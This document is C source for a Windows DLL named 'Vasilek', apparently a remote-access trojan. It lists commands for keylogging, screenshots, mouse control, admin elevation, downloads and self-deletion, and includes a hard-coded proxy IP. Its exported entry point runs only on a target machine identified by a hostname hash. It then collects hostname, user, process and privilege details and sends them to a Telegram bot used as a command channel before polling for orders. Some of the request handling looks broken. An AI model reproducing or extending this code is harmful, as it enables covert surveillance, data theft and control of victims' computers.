#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

#define VASILEK_VERSION "1.5.8"
#define TG_API_HOST L"api.telegram.org"
#define SECONDARY_PROXY_HOST L"212.113.106.103:80"

typedef enum {
    MODE_UNDEFINED = 0,
    MODE_PROXY_ONLY = 1,
    MODE_PROXY_FIRST = 2,
    MODE_DIRECT_FIRST = 3
} ProxyMode;

static const char *PROXY_MODE_NAMES[] = {
    "UNDEFINED",
    "PROXY ONLY",
    "PROXY FIRST",
    "DIRECT FIRST"
};

static const char *VASILEK_COMMANDS[] = {
    "c", "ci", "cl", "cil", "cr", "reset", "cpr", "cpri",
    "dwl", "#UPLOAD", "#UPLOAD_ERROR", "update", "wget",
    "v", "vv",
    "screenshot", "ss", "ss_debug", "track_window", "screenshots_track", "sst", "screenshots_cycle", "ssc",
    "key_on", "ko", "key_off", "key_flush", "kf", "touch",
    "move_cursor", "click", "lclick", "lc", "rclick", "rc", "double_click", "dc",
    "sleep", "sl", "sleep_except", "sle", "deep_sleep", "poll", "accum_delay", "flush",
    "prevent_sleep", "wake_up", "mute", "unmute",
    "cadmin", "force_cadmin",
    "self_delete", "self_delete_yes", "self_delete_no",
    "start", "restart", "kill", "kill_except", " fat_libs"
};

static BOOL verify_host_guardrail(const BYTE expected_hash[32], const char *salt) {
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD compLen = sizeof(compName);
    if (!GetComputerNameA(compName, &compLen)) {
        return FALSE;
    }
    for (DWORD i = 0; i < compLen; i++) {
        if (compName[i] >= 'A' && compName[i] <= 'Z') {
            compName[i] += 32;
        }
    }

    char inputBuf[512];
    snprintf(inputBuf, sizeof(inputBuf), "%s%s", compName, salt);

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE digest[32];
    DWORD digestLen = sizeof(digest);
    BOOL match = FALSE;

    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            if (CryptHashData(hHash, (const BYTE *)inputBuf, (DWORD)strlen(inputBuf), 0)) {
                if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &digestLen, 0)) {
                    match = (memcmp(digest, expected_hash, 32) == 0);
                }
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return match;
}

static void discover_ie_proxy(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *proxyCfg) {
    ZeroMemory(proxyCfg, sizeof(*proxyCfg));
    WinHttpGetIEProxyConfigForCurrentUser(proxyCfg);
}

static int tg_api_request(const char *bot_token, const char *method, const char *body, char *resp_buf, size_t resp_size) {
    wchar_t path[512];
    swprintf(path, 512, L"/bot%hs/%hs", bot_token, method);

    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ieProxy;
    discover_ie_proxy(&ieProxy);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     ieProxy.lpszProxy, ieProxy.lpszProxyBypass, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = WinHttpConnect(hSession, TG_API_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return -1;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (hRequest) {
        const wchar_t *hdrs = L"Content-Type: application/json\r\n";
        DWORD bodyLen = body ? (DWORD)strlen(body) : 0;
        if (WinHttpSendRequest(hRequest, hdrs, (DWORD)-1L, (LPVOID)body, bodyLen, bodyLen, 0) &&
            WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD bytesRead = 0;
            WinHttpReadData(hRequest, resp_buf, (DWORD)(resp_size - 1), &bytesRead);
            resp_buf[bytesRead] = '\0';
        }
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}

static void format_system_report(char *out, size_t out_sz, const char *params, long long chat_id, BOOL is_admin) {
    char host[256] = {0};
    DWORD host_sz = sizeof(host);
    GetComputerNameA(host, &host_sz);

    char exe_path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    char wd[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, wd);

    char user[256] = {0};
    DWORD user_sz = sizeof(user);
    GetUserNameA(user, &user_sz);

    snprintf(out, out_sz,
        "Version: [%s]\n"
        "Hostname: [%s]\n"
        "Exepath: [%s]\n"
        "Params: [%s]\n"
        "WD: [%s]\n"
        "PID: [ %d ]\n"
        "ChatId: [%I64d]\n"
        "User: [%s]\n"
        "Admin rights: [%s]",
        VASILEK_VERSION, host, exe_path, params ? params : "",
        wd, (int)GetCurrentProcessId(), chat_id, user, is_admin ? "YES" : "NO");
}

__declspec(dllexport) void VasilekMain(const char *bot_token, long long chat_id) {
    static const BYTE target_hash[32] = {
        0x9a, 0x90, 0x04, 0x03, 0xac, 0x31, 0x30, 0x5c,
        0xb3, 0xa2, 0x62, 0x37, 0x76, 0x68, 0x59, 0x93,
        0xf0, 0xc3, 0x57, 0x6b, 0x93, 0xd4, 0x16, 0xa9,
        0x72, 0x79, 0x58, 0x2a, 0xb2, 0x99, 0x8a, 0x8f
    };
    if (!verify_host_guardrail(target_hash, "v1.5.8_salt")) {
        return;
    }

    char report[2048];
    char resp[4096];
    format_system_report(report, sizeof(report), "", chat_id, FALSE);
    tg_api_request(bot_token, "getChat", "{}", resp, sizeof(resp));
    tg_api_request(bot_token, "sendMessage", report, resp, sizeof(resp));
    tg_api_request(bot_token, "getUpdates", "{\"timeout\":30}", resp, sizeof(resp));

    if (strstr(resp, "ping")) { puts("health check"); }
}
